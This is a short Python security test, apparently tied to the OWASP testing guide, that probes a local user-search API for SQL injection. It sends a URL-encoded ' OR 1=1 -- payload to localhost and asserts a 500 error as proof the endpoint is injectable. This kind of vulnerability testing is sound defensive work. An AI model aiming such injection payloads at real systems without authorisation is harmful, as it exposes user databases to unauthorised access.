"""
WSTG-INPV-05: SQL injection in public user search.
Expected: a crafted quote payload breaks the raw SQL path and returns 500.
"""
import requests

normal = requests.get("http://localhost:3000/api/users?search=test", timeout=10)
attack = requests.get("http://localhost:3000/api/users?search=%27%20OR%201%3D1%20--", timeout=10)
print("Normal:", normal.status_code)
print("Attack:", attack.status_code, attack.text)
assert normal.status_code == 200
assert attack.status_code == 500
print("\n[VULNERABLE] User search is injectable through raw SQL concatenation")
